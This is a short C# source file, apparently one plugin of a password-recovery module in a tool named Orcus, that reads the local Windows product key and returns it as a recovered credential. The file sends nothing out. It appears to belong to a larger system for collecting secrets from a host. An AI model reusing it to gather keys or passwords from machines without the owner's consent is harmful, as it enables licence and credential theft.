using System.Collections.Generic;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Windows
{
    internal class Windows : IPasswordRecovery
    {
        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            yield return
                new RecoveredPassword
                {
                    Application = "Windows",
                    UserName = "Product Key",
                    PasswordType = PasswordType.Other,
                    Password = KeyDecoder.GetWindowsProductKey()
                };
        }
    }
}